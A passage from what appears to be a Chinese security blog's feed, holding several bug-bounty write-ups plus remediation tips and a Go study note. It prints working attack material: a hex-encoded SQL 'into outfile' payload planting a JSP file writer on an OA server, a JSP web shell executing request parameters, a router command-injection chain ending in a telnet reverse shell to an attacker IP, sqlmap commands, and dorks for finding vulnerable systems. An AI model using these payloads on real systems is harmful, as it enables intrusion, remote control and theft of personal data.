class="hljs-string">&quot;t&quot;</span>).getBytes());%&gt;<br></code></pre></td></tr></table></figure><p>通过一个<code>f</code>参数上传脚本</p><p>由于特殊符号存在，URL编码会造成写入后代码错误，故采用<code>hex</code>编码后<code>unhex</code>函数处理上传，写入文件名为：<code>he1p.jsp</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27D:/UFseeyon_2020/OA/tomcat/webapps/yyoa/he1p.jsp%27<br></code></pre></td></tr></table></figure><p>上传成功👍</p><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_11-42-50.png"></p><h4 id="构造本地html上传RCE脚本"><a href="#构造本地html上传RCE脚本" class="headerlink" title="构造本地html上传RCE脚本"></a>构造本地html上传RCE脚本</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://x.x.x.x/yyoa/he1p.jsp?f=he11o.jsp&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">name</span>=<span class="hljs-string">t</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">120</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">10</span> <span class="hljs-attr">width</span>=<span class="hljs-string">45</span>&gt;</span>your code<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上传<code>RCE</code>脚本，这里尝试了蚁剑马和冰蝎马都连不上，最后选择了RCE这种方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;b&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123;<br>        java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;i&quot;</span>)).getInputStream();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;<br>            out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b));<br>        &#125;<br>        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_16-23-46.png"></p><p>上传后在浏览器里输入：<code>http://x.x.x.x:8001/yyoa/he11o.jsp?pwd=b&amp;i=whoami</code>，即可执行系统命令</p><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_16-25-59.png"></p><p>一个妥妥的高危到手👍👍👍</p><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-08_21-27-16.png"></p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SRC冲榜宝典</title>
    <link href="/2023/09/03/SRC%E5%86%B2%E6%A6%9C%E5%AE%9D%E5%85%B8/"/>
    <url>/2023/09/03/SRC%E5%86%B2%E6%A6%9C%E5%AE%9D%E5%85%B8/</url>
    
    <content type="html"><![CDATA[<p>记录一些自己刷洞的经验啦😊😊😊</p><span id="more"></span><h3 id="盒子公益SRC的一些说明"><a href="#盒子公益SRC的一些说明" class="headerlink" title="盒子公益SRC的一些说明"></a>盒子公益SRC的一些说明</h3><h4 id="审核"><a href="#审核" class="headerlink" title="审核"></a>审核</h4><p>通常需要1-10天的时间等待厂商认领及处理。<br>也就是说一个漏洞 审核期间+漏洞确认期间，大概10天左右</p><p>上分最好的时间点：<strong>上个月的25-28号-当月的20号</strong></p><p>20号以后：可以把漏洞都攒起来 到25-28号左右一块提交，然后下个月的排行榜上绝对有你的名字</p><h3 id="常用工具命令"><a href="#常用工具命令" class="headerlink" title="常用工具命令"></a>常用工具命令</h3><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -r &quot;./test2.txt&quot; --threads=10 --tamper=between --time-sec=2 --dbms=mysql --union-char=a --random-agent<br></code></pre></td></tr></table></figure><h4 id="xssStrike"><a href="#xssStrike" class="headerlink" title="xssStrike"></a>xssStrike</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python xsstrike.py -u XXX --crawl -l 4 --skip-dom<br></code></pre></td></tr></table></figure><h3 id="漏洞修复建议"><a href="#漏洞修复建议" class="headerlink" title="漏洞修复建议"></a>漏洞修复建议</h3><h4 id="弱口令修复建议："><a href="#弱口令修复建议：" class="headerlink" title="弱口令修复建议："></a>弱口令修复建议：</h4><p>（1）使用多种字符组合的强密码，如大小写字母+数字+特殊字符；<br>（2）用户密码中不要出现与用户名或者系统名相关的字符，如用户名@123、系统名123等；<br>（3）不要使用系统默认初始密码；或设定在系统首次登录时，强制修改系统默认初始密码；<br>（4）应避免部门或单位对成员设置相同密码；<br>（5）对系统中密码的存储进行加密处理，避免密码明文存储；<br>（6）增强用户安全意识，定期变更系统密码；<br>（7）应避免同一密码用于多个系统，避免由于信息泄露导致的安全风险连锁反应；</p><h4 id="Thiniphp日志泄露修复建议："><a href="#Thiniphp日志泄露修复建议：" class="headerlink" title="Thiniphp日志泄露修复建议："></a>Thiniphp日志泄露修复建议：</h4><p>1.升级Thinkphp版本<br>2.关闭Thinkphp的debug模式<br>3.控制访问路径权限或者隐藏日志路径</p><h4 id="未授权访问修复建议："><a href="#未授权访问修复建议：" class="headerlink" title="未授权访问修复建议："></a>未授权访问修复建议：</h4><p>加入用户身份认证机制或token验证，对系统的功能点增加权限控制。<br>&lt;1&gt; 采用Java过滤器技术，对&#x2F;pages下所有的URL进行登录状态检查，通过session.getAttribute（）方法从session中获取登录成功时存入的session中的身份标识，判断客户端传递过来的身份标识是否与session中保存的一致，不一致则跳转到登录页面，关键代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//从session里取的用户名信息</span><br><span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> (String) session.getAttribute(<span class="hljs-string">&quot;userID&quot;</span>);<br><span class="hljs-comment">//getAttribute中变量根据实际变量传入。</span><br><span class="hljs-comment">//判断如果没有取到用户信息,就跳转到登陆页面</span><br><span class="hljs-keyword">if</span> ((username == <span class="hljs-literal">null</span>) || <span class="hljs-string">&quot;&quot;</span>.equals(username)) &#123;<br>    <span class="hljs-comment">//跳转到登陆页面</span><br>    res.sendRedirect(<span class="hljs-string">&quot;http://&quot;</span> + req.getHeader(<span class="hljs-string">&quot;Host&quot;</span>) +<span class="hljs-string">&quot;/login_oa.jsp&quot;</span>);<br>&#125; <br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//已经登陆,继续此次请求</span><br>    chain.doFilter(req, res); <br>&#125;<br></code></pre></td></tr></table></figure><p>&lt;2&gt; 进行权限判断，以下代码为过滤器程序，通过会话获取用户身份信息，进行权限判断等操作</p><p>&#x2F;&#x2F;在配置文件中设置过滤器SessionFilter com.nsfocus.frame.filter.SessionFilterSessionFilter&#x2F;pages</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response,FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>    <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>    <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> req.getSession(<span class="hljs-literal">true</span>);<br>    <span class="hljs-comment">//从session里取的用户名信息</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> (String) session.getAttribute(<span class="hljs-string">&quot;userID&quot;</span>);<br>    <span class="hljs-comment">//getAttribute中变量根据实际变量传入。</span><br>    <span class="hljs-comment">//判断如果没有取到用户信息,就跳转到登陆页面 </span><br>    <span class="hljs-keyword">if</span> ((username == <span class="hljs-literal">null</span>) || <span class="hljs-string">&quot;&quot;</span>.equals(username)) &#123;<br>        <span class="hljs-comment">//跳转到登陆页面</span><br>        res.sendRedirect(<span class="hljs-string">&quot;http://&quot;</span> + req.getHeader(<span class="hljs-string">&quot;Host&quot;</span>) +<span class="hljs-string">&quot;/login_oa.jsp&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//已经登陆,继续此次请求</span><br>        chain.doFilter(req, res); <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>。</p><h4 id="SQL注入修复建议："><a href="#SQL注入修复建议：" class="headerlink" title="SQL注入修复建议："></a>SQL注入修复建议：</h4><p>（1）使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。<br>（2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。<br>（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。<br>（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。<br>（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。<br>（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。<br>（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。<br>（8）过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</p><h3 id="GoogleHacking快速寻找脆弱系统："><a href="#GoogleHacking快速寻找脆弱系统：" class="headerlink" title="GoogleHacking快速寻找脆弱系统："></a>GoogleHacking快速寻找脆弱系统：</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">intext:后台登录  inurl:login.php -canvas -十合一全网营销方案<br>intext:管理员登录  inurl:login.php -canvas -十合一全网营销方案 -U盾<br>intext:后台登录  inurl:login.asp -焦点网络 -Administrator Login<br>intext:管理员登录  inurl:login.asp -焦点网络 -Administrator Login<br></code></pre></td></tr></table></figure><h3 id="fofa快速寻找脆弱系统"><a href="#fofa快速寻找脆弱系统" class="headerlink" title="fofa快速寻找脆弱系统:"></a>fofa快速寻找脆弱系统:</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">port=<span class="hljs-string">&quot;6379&quot;</span>&amp;&amp;city=<span class="hljs-string">&quot;Kunming&quot;</span>&amp;&amp;protocol=<span class="hljs-string">&quot;redis&quot;</span><br>title=<span class="hljs-string">&quot;tomcat&quot;</span>&amp;&amp;server==<span class="hljs-string">&quot;Apache&quot;</span>&amp;&amp;status_code=<span class="hljs-string">&quot;200&quot;</span>&amp;&amp;country=<span class="hljs-string">&quot;CN&quot;</span><br>header=<span class="hljs-string">&quot;thinkphp&quot;</span>&amp;&amp;country=<span class="hljs-string">&quot;CN&quot;</span>&amp;&amp;title=<span class="hljs-string">&quot;后台管理&quot;</span><br>header=<span class="hljs-string">&quot;thinkphp&quot;</span>&amp;&amp;country=<span class="hljs-string">&quot;CN&quot;</span>&amp;&amp;title=<span class="hljs-string">&quot;后台管理&quot;</span>&amp;&amp;after=<span class="hljs-string">&quot;2021-01-01&quot;</span><br>header=<span class="hljs-string">&quot;/yyoa&quot;</span>&amp;&amp;body!=<span class="hljs-string">&quot;您使用的浏览器不适合本系统运行要求&quot;</span>&amp;&amp;country=<span class="hljs-string">&quot;CN&quot;</span><br>(icon_hash=<span class="hljs-string">&quot;-1231872293&quot;</span> || icon_hash=<span class="hljs-string">&quot;706913071&quot;</span>)&amp;&amp;org=<span class="hljs-string">&quot;China Education and Research Network Center&quot;</span> <span class="hljs-comment">#ruoyi</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
      <tag>技巧</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次eduSRC挖掘-230827</title>
    <link href="/2023/08/31/%E4%B8%80%E6%AC%A1eduSRC%E6%8C%96%E6%8E%98-230827/"/>
    <url>/2023/08/31/%E4%B8%80%E6%AC%A1eduSRC%E6%8C%96%E6%8E%98-230827/</url>
    
    <content type="html"><![CDATA[<p>一次有意思的教育SRC逻辑漏洞</p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这次挖到一个有意思的逻辑漏洞👍</p><p>在挖掘教育SRC时，我们可以关注到一个必然存在交互的地方，那就是录取查询，这里必然是有一个查询框，所以可以测一测</p><h3 id="某职业学院的录取查询页面"><a href="#某职业学院的录取查询页面" class="headerlink" title="某职业学院的录取查询页面"></a>某职业学院的录取查询页面</h3><p><a href="http://xxx.xxx.edu.cn/lqcx.htm">http://xxx.xxx.edu.cn/lqcx.htm</a></p><p><img src="/2023/08/31/%E4%B8%80%E6%AC%A1eduSRC%E6%8C%96%E6%8E%98-230827/Snipaste_2023-08-31_22-41-26.png"></p><p>可以发现这里的查询很简单，只要输入身份证的后8位即可查询到录取信息，所以这里我们不妨抓个包试试，发现是明文传输数据，好家伙，这里可以打打SQL注入，打了，没有哈哈</p><h3 id="存在逻辑缺陷"><a href="#存在逻辑缺陷" class="headerlink" title="存在逻辑缺陷"></a>存在逻辑缺陷</h3><p>点击查询后抓包，修改参数<code>sfh8w</code>，试一试是不是可以获取别人的信息</p><p>那我改一下身份证后4位然后爆破，然后，居然真有，还这么多</p><p><img src="/2023/08/31/%E4%B8%80%E6%AC%A1eduSRC%E6%8C%96%E6%8E%98-230827/Snipaste_2023-08-31_22-46-05.png"></p><p>输一个查询试试，可以发现虽然中间8位打了马，但是查询的时候用了后8位，相当于只打了4位的马，然后呢，身份证嘛，那打码的4位，猜都猜得到，2004-2006，试试就行了</p><p><img src="/2023/08/31/%E4%B8%80%E6%AC%A1eduSRC%E6%8C%96%E6%8E%98-230827/Snipaste_2023-08-31_22-44-30.png"></p><p>然后，这里也不能叫越权吧，应该算是设计上的逻辑缺陷，只凭身份证后8位就可以查询信息了哈哈</p><p>交了，妥妥一个中危👍👍</p><p><img src="/2023/08/31/%E4%B8%80%E6%AC%A1eduSRC%E6%8C%96%E6%8E%98-230827/Snipaste_2023-08-31_22-52-30.png"></p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
      <tag>逻辑漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次路由器Getshell-230829</title>
    <link href="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/"/>
    <url>/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/</url>
    
    <content type="html"><![CDATA[<p><code>Hytec Inter HWL-2511-SS popen.cgi命令注入漏洞实战复现</code></p><p>一次路由器Getshell</p><span id="more"></span><h3 id="访问到路由器web页面"><a href="#访问到路由器web页面" class="headerlink" title="访问到路由器web页面"></a>访问到路由器web页面</h3><p>fofa搜索:<code>title=&quot;index&quot; &amp;&amp; header=&quot;lighttpd/1.4.30&quot;</code>，<code>lighttpd</code>是一个轻量级的服务器中间件</p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/1.png"></p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/3.png"></p><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>发现<code>cgi-bin</code>页面，引发命令注入，这里发现不需要注入，直接执行了命令</p><p><code>https://x.x.x.x:8090/cgi-bin/popen.cgi?command=ls&amp;v=0.1303033443137912</code></p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/2.png"></p><p>获取信息：</p><p><code>/cgi-bin/popen.cgi?command=uname -a&amp;v=0.1303033443137912</code>，发现一个<code>MIPS</code>的<code>Linux</code>系统，显然的嵌入式设备了</p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/5.png"></p><p><code>/cgi-bin/popen.cgi?command=ls /www&amp;v=0.1303033443137912</code>，发现这个<code>web</code>应用居然是用纯<code>html+js</code>写的，无语了🤣，后续<code>Getshell</code>有点麻烦了</p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/6.png"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>既然可以命令注入，那么首先就是想到反弹shell，这里笔者走了许多弯路</p><h4 id="尝试nc反弹shell"><a href="#尝试nc反弹shell" class="headerlink" title="尝试nc反弹shell"></a>尝试nc反弹shell</h4><p>执行命令<code>/cgi-bin/popen.cgi?command=nc&amp;v=0.1303033443137912</code></p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/4.png"></p><p>发现出现了<code>BusyBox</code>字样，笔者此时对其不太了解，先学习一下：</p><p><a href="https://zh.wikipedia.org/zh-hans/BusyBox">BusyBox-wiki</a></p><p>原来是是嵌入式里的命令行系统软件，相当于一个精简版的<code>Linux shell</code>，其中的<code>nc</code>命令都是被阉割的，于是首先想到能否弄一个完整版的的<code>nc</code>，于是测试是否有<code>yum</code>、<code>apt</code>命令，和想的差不多，没有哈哈😒，只有一个<code>wget</code>命令，那么能不能<code>wget</code>一个<code>nc</code>，然后自己编译呢，于是试试，</p><p><code>/cgi-bin/popen.cgi?command=wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz</code></p><p>结果不支持，真无语，以前没搞过嵌入式设备，无奈放弃🤣</p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/7.png"></p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/8.png"></p><h4 id="柳暗花明-telnet反弹Shell"><a href="#柳暗花明-telnet反弹Shell" class="headerlink" title="柳暗花明-telnet反弹Shell"></a>柳暗花明-telnet反弹Shell</h4><p>在查阅路由器如何反弹shell时，无意间看到了这样一句话</p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/9.png"></p><p>好家伙，直接开冲啊，弹弹弹！</p><ol><li><p>开启telnet：<code>/cgi-bin/popen.cgi?command=telnetd&amp;v=0.1303033443137912</code></p></li><li><p>攻击机上启监听：<code>nc -lvvp </code></p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/10.png"></p></li><li><p>弹shell：分两次执行</p><p><code>mknod a p</code></p><p><code>telnet x.x.x.x 5555 0&lt;a | /bin/bash 1&gt;a (x.x.x.x为攻击机ip)</code></p></li></ol><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/11.png"></p><p>监听到了，反弹成功！</p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/12.png"></p><p>第一次拿到路由器系统的说，哈哈恶趣味一把😘</p><p><img src="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell-230829/13.png"></p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
      <tag>路由器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次公益src挖掘-230820</title>
    <link href="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/"/>
    <url>/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/</url>
    
    <content type="html"><![CDATA[<p>幸运儿之登陆框发现SQL注入哈哈🤣😂</p><span id="more"></span><h3 id="Google语法找目标"><a href="#Google语法找目标" class="headerlink" title="Google语法找目标"></a>Google语法找目标</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">intext:后台登录  inurl:login.php -canvas -十合一全网营销方案<br></code></pre></td></tr></table></figure><h3 id="发现登录页面"><a href="#发现登录页面" class="headerlink" title="发现登录页面"></a>发现登录页面</h3><p><img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-16-54.png"></p><p>抓包，</p><p><img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-22-15.png"></p><p>首先测试弱口令爆破，</p><p><img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-18-37.png"></p><p>还以为有希望，结果不是🤣</p><h3 id="发现存在SQL注入"><a href="#发现存在SQL注入" class="headerlink" title="发现存在SQL注入"></a>发现存在SQL注入</h3><p>传统艺能之跑<code>sqlmap</code>，保存请求包到txt文件，使用命令：<code>python sqlmap.py -r &quot;./test.txt&quot; --threads=10 --tamper=between --time-sec=2 --dbms=mysql --union-char=a --dbs</code>，欸嘿，还真跑出来了😎</p><p><img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-23-17.png"></p><p>跑个数据名和表名作为证据：</p><p><img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-20_18-25-55.png"></p><p>点到为止就可以提交到平台啦！</p><p>一个妥妥的高危，俺也是幸运儿啦！😊😊</p><p><img src="/2023/08/20/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230820/Snipaste_2023-08-31_23-04-41.png"></p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GO学习笔记_1</title>
    <link href="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/"/>
    <url>/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/</url>
    
    <content type="html"><![CDATA[<p>跟着《GO圣经》学习GO啦！</p><span id="more"></span><h3 id="Go的优势"><a href="#Go的优势" class="headerlink" title="Go的优势"></a>Go的优势</h3><ul><li><p>简单易学</p></li><li><ul><li>Go语言的作者都有C的基因，Go自然而然也有了C的基因，但是Go的语法比C还简单, 并且几乎支持大多数你在其他语言见过的特性：封装、继承、多态、反射等</li></ul></li><li><p>丰富的标准库</p></li><li><ul><li>Go目前已经内置了大量的库，特别是网络库非常强大</li><li>前面说了作者是C的作者，所以Go里面也可以直接包含c代码，利用现有的丰富的C库</li></ul></li><li><p>跨平台编译和部署</p></li><li><ul><li>Go代码可直接编译成机器码，不依赖其他库，部署就是扔一个文件上去就完事了. 并且Go代码还可以做到跨平台编译(例如: window系统编译linux的应用)</li></ul></li><li><p>内置强大的工具</p></li><li><ul><li>Go语言里面内置了很多工具链，最好的应该是gofmt工具，自动化格式化代码，能够让团队review变得如此的简单，代码格式一模一样，想不一样都很困难</li></ul></li><li><p>性能优势: Go 极其地快。其性能与 C 或 C++相似。在我们的使用中，Go 一般比 Python 要快 30 倍左右</p></li><li><ul><li>语言层面支持并发，这个就是Go最大的特色，天生的支持并发，可以充分的利用多核，很容易的使用并发</li><li>内置runtime，支持垃圾回收</li></ul></li></ul><h3 id="Go环境搭建"><a href="#Go环境搭建" class="headerlink" title="Go环境搭建"></a>Go环境搭建</h3><h4 id="Goland下载安装"><a href="#Goland下载安装" class="headerlink" title="Goland下载安装"></a>Goland下载安装</h4><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-15_19-49-47.png"></p><p><a href="https://www.jetbrains.com/go/download/other.html">Goland各版本下载</a></p><p><a href="https://chenjunan.top/detail/Detail?id=37">Goland破解教程</a></p><h4 id="Go语言安装"><a href="#Go语言安装" class="headerlink" title="Go语言安装"></a>Go语言安装</h4><p><a href="https://go.dev/dl/">官网地址</a></p><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-15_19-51-26.png"></p><p><code>go version</code>查看是否安装完成</p><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-15_19-55-52.png"></p><h3 id="开始GO-——Part1"><a href="#开始GO-——Part1" class="headerlink" title="开始GO!——Part1"></a>开始GO!——Part1</h3><p>笔者跟着《Go语言圣经》一起学习的~~😘</p><p>对应第一章</p><h4 id="编写第一个GO程序"><a href="#编写第一个GO程序" class="headerlink" 